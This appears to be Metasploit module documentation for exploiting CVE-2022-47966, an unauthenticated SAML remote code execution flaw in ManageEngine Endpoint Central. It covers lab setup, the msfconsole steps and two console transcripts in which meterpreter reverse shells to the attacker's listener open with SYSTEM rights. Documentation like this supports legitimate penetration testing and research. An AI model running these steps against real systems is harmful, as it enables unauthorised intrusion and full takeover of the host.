## Vulnerable Application
This exploits an unauthenticated remote code execution vulnerability that affects Zoho ManageEngine Endpoint Central and MSP
versions 10.1.2228.10 and below. See [ManageEngine security advisory](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html).
Due to a dependency to an outdated library (Apache Santuario version 1.4.1), it is possible to execute arbitrary code
by providing a crafted samlResponse XML to the Endpoint Central SAML endpoint.

Note that the target is only vulnerable if SAML-based SSO is configured and enabled.

## Installation

### SAML 2.0 Identity Provider
If you don't have an already SAML 2.0 Identity Provider (IdP), you can use this free one for testing: https://mocksaml.com/
Download the IdP xml information by pressing the button `Download Metadata`.

### Download the installers
Go to https://archives.manageengine.com/, fill the form with any data and select ManageEngine Endpoint Central product
with any version (e.g. 10.1.2228.10). You can then have access to all the versions and platform installers.
After downloading the Windows Installer, launch the installer and select all the default options
or make adjustments on the port you want to use by clicking Next.
(you can skip the Registration for Technical Support part, it is optional).

When the installation is done, select Start Endpoint Central Server and click Finish.
This will start a browser and get you to the login page.

### Enable SAML 2.0 SSO
- Go to http://localhost:8020 or other port that you configured during the installation.
- Log in as admin (default admin/admin)
- Go to http://localhost:8020/webclient#/uems/admin/saml-configuration
- Click on SAML Authentication at the ​​Global Settings menu at the left pane.

In Identity Provider Details section:
- Select `Other` option in the  `IdP provider` field
- Provide a name in the `IdP name` field
- Select `Username` option in the `ID Name` field
- Select the `Metadata` radio button in the `Configuration by uploading` field
- And last but not least upload the downloaded xml configuration file from Mock SAML in the `Upload metadata` field
- Click save and you are done

## Verification Steps
- [ ] Start `msfconsole`
- [ ] use `exploit/windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966`
- [ ] set `LHOST` with target IP
- [ ] set `LPORT` with target port
- [ ] set `TARGET` with `0` (Windows EXE dropper) or `1` (Windows Command)
- [ ] `exploit`

You should get a `shell` or `meterpreter` session depending on the target and payload settings.

**Note:** `Windows Defender` might get in the way, depending on the version your are running so disable it on your Windows Machine.
The same applies for `Windows Defender Firewall` if you can not access the  application. Your port might be blocked.

In the test cases below, ManageEngine Endpoint Central version `10.1.2228.5` was tested on Microsoft Server 2019 Standard
with Windows Defender disabled otherwise all standard payloads will fail.

## Options

### TARGETURI
The Endpoint Central SAML endpoint URL. Set to `/SamlResponseServlet` by default.

### DELAY
This sets the number of seconds to wait between each request. It is
particularly useful when using a big payload with the `cmdstager` (Target 0),
which requires sending multiple requests to the target. Endpoint Central has an
anti-DoS mechanism that blocks the source IP address if requests are sent too
fast. This option is set to 5 seconds by default, which seems to be a safe
value.

## Scenarios

### Endpoint Central version 10.1.2228.5 - Target 1 (Windows Command)
```
msf6 exploit(windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966) > set rhosts 192.168.100.58
rhosts => 192.168.100.58
msf6 exploit(windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966) > set lhost 192.168.100.7
lhost => 192.168.100.7
msf6 exploit(windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966) > exploit

[*] Started reverse TCP handler on 192.168.100.7:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. SAML-based SSO is enabled.
[*] Executing Windows Command for cmd/windows/powershell/meterpreter/reverse_tcp
[*] Sending stage (175686 bytes) to 192.168.100.58
[*] Meterpreter session 1 opened (192.168.100.7:4444 -> 192.168.100.58:55450) at 2023-01-29 07:19:10 +0000

meterpreter > sysinfo
Computer        : WIN-BJDNH44EEDB
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 4100 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\DesktopCentral_Server\bin>
```
### Endpoint Central version 10.1.2228.5 - Target 0 (Windows EXE dropper)
```
msf6 exploit(windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966) > exploit

[*] Started reverse TCP handler on 192.168.100.7:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. SAML-based SSO is enabled.
[*] Executing Windows EXE Dropper for windows/x64/meterpreter/reverse_tcp
[*] Command Stager progress -  17.01% done (2046/12025 bytes)
[*] Command Stager progress -  34.03% done (4092/12025 bytes)
[*] Command Stager progress -  51.04% done (6138/12025 bytes)
[*] Command Stager progress -  68.06% done (8184/12025 bytes)
[*] Command Stager progress -  84.24% done (10130/12025 bytes)
[*] Sending stage (200774 bytes) to 192.168.100.58
[*] Command Stager progress - 100.00% done (12025/12025 bytes)
[*] Meterpreter session 3 opened (192.168.100.7:4444 -> 192.168.100.58:55489) at 2023-01-29 07:22:47 +0000

meterpreter > shell
Process 7364 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\DesktopCentral_Server\bin>
```

## Limitations
No limitations identified.
